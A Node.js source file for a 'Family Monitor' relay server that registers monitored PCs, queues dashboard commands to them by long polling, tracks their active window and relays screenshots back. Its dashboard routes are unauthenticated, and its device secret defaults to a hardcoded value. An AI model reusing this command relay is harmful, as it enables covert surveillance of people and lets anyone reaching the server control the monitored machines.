const http = require('http');
const crypto = require('crypto');

const PORT   = process.env.PORT || 3000;
const SECRET = process.env.FM_SECRET || 'fm2025secret';

// devices[deviceId] = { info, cmdQueue, responses, waitingDash, waitingPoll, lastSeen }
const devices = {};

function getDevice(id) {
    if (!devices[id]) devices[id] = {
        info: {}, cmdQueue: [], responses: {},
        waitingDash: {}, waitingPoll: null, lastSeen: 0
    };
    return devices[id];
}

// Cleanup old devices every hour
setInterval(() => {
    const cutoff = Date.now() - 24*3600*1000;
    for (const id in devices) if (devices[id].lastSeen < cutoff) delete devices[id];
}, 3600*1000);

function readBody(req) {
    return new Promise(resolve => {
        const chunks = [];
        req.on('data', c => chunks.push(c));
        req.on('end', () => resolve(Buffer.concat(chunks)));
    });
}

function sendJson(res, code, obj) {
    const b = Buffer.from(JSON.stringify(obj));
    res.writeHead(code, {
        'Content-Type': 'application/json',
        'Content-Length': b.length,
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type,x-fm-secret',
        'Access-Control-Allow-Methods': 'GET,POST,OPTIONS',
    });
    res.end(b);
}

function sendBuf(res, buf, ct) {
    res.writeHead(200, {
        'Content-Type': ct,
        'Content-Length': buf.length,
        'Access-Control-Allow-Origin': '*',
    });
    res.end(buf);
}

http.createServer(async (req, res) => {
    if (req.method === 'OPTIONS') {
        res.writeHead(204, {
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Headers': 'Content-Type,x-fm-secret',
            'Access-Control-Allow-Methods': 'GET,POST,OPTIONS',
        });
        return res.end();
    }

    const u = new URL(req.url, 'http://x');
    const path = u.pathname;
    const qs = u.searchParams;

    // ── DEVICE ROUTES (called by EXE) ──
    if (req.headers['x-fm-secret'] !== SECRET && path.startsWith('/d/')) {
        return sendJson(res, 401, { error: 'unauthorized' });
    }

    // POST /d/hello  { deviceId, pc, user, home }
    if (path === '/d/hello' && req.method === 'POST') {
        const body = JSON.parse((await readBody(req)).toString());
        const d = getDevice(body.deviceId);
        d.info = { ...body, online: true };
        d.lastSeen = Date.now();
        console.log('HELLO', body.deviceId, body.pc, body.user);
        return sendJson(res, 200, { ok: true });
    }

    // GET /d/poll?id=xxx  long-poll for next command
    if (path === '/d/poll' && req.method === 'GET') {
        const id = qs.get('id');
        const d = getDevice(id);
        d.info.online = true;
        d.lastSeen = Date.now();

        if (d.cmdQueue.length > 0) return sendJson(res, 200, d.cmdQueue.shift());

        let timer;
        d.waitingPoll = (cmd) => {
            clearTimeout(timer);
            d.waitingPoll = null;
            if (!res.headersSent) sendJson(res, 200, cmd || { type: 'noop' });
        };
        timer = setTimeout(() => d.waitingPoll && d.waitingPoll(null), 25000);
        req.on('close', () => { clearTimeout(timer); d.waitingPoll = null; });
        return;
    }

    // POST /d/resp?id=xxx&reqId=xxx&ct=xxx  device sends response
    if (path === '/d/resp' && req.method === 'POST') {
        const id    = qs.get('id');
        const reqId = qs.get('reqId');
        const ct    = qs.get('ct') || 'application/json';
        const body  = await readBody(req);
        const d = getDevice(id);
        d.lastSeen = Date.now();

        if (d.waitingDash[reqId]) {
            const dashRes = d.waitingDash[reqId];
            delete d.waitingDash[reqId];
            if (!dashRes.headersSent) sendBuf(dashRes, body, ct);
        } else {
            d.responses[reqId] = { body, ct };
        }
        return sendJson(res, 200, { ok: true });
    }

    // POST /d/beat?id=xxx  heartbeat with active window
    if (path === '/d/beat' && req.method === 'POST') {
        const id   = qs.get('id');
        const body = JSON.parse((await readBody(req)).toString());
        const d = getDevice(id);
        d.lastSeen = Date.now();
        d.info.online = true;
        d.info.activeWindow = body.w || '';
        d.info.monitoring   = body.m !== false;
        return sendJson(res, 200, { ok: true });
    }

    // ── DASHBOARD ROUTES (called by browser) ──

    // GET /dash/devices
    if (path === '/dash/devices') {
        const list = Object.entries(devices).map(([id, d]) => ({
            deviceId:     id,
            pc:           d.info.pc || id,
            user:         d.info.user || '?',
            home:         d.info.home || '',
            online:       d.info.online && (Date.now() - d.lastSeen < 35000),
            lastSeen:     d.lastSeen,
            activeWindow: d.info.activeWindow || '',
            monitoring:   d.info.monitoring !== false,
        }));
        return sendJson(res, 200, list);
    }

    // POST /dash/cmd  { deviceId, type, payload }  → response from device
    if (path === '/dash/cmd' && req.method === 'POST') {
        const body = JSON.parse((await readBody(req)).toString());
        const { deviceId: id, type, payload } = body;
        const d = devices[id];
        if (!d) return sendJson(res, 404, { error: 'device not found' });

        const reqId = crypto.randomBytes(8).toString('hex');
        const cmd   = { type, payload, reqId };
        const timeout = type === 'screenshot' ? 15000 : 10000;

        // Check if device already sent response
        if (d.responses[reqId]) {
            const r = d.responses[reqId];
            delete d.responses[reqId];
            return sendBuf(res, r.body, r.ct);
        }

        // Park dashboard response, push cmd to device
        d.waitingDash[reqId] = res;

        if (d.waitingPoll) {
            const resolve = d.waitingPoll;
            d.waitingPoll = null;
            resolve(cmd);
        } else {
            d.cmdQueue.push(cmd);
        }

        const t = setTimeout(() => {
            delete d.waitingDash[reqId];
            if (!res.headersSent) sendJson(res, 504, { error: 'device timeout' });
        }, timeout);

        req.on('close', () => {
            clearTimeout(t);
            delete d.waitingDash[reqId];
        });
        return;
    }

    // GET /  health check
    if (path === '/') {
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        return res.end('Family Monitor Relay\n');
    }

    sendJson(res, 404, { error: 'not found' });

}).listen(PORT, () => console.log('Relay on port', PORT));
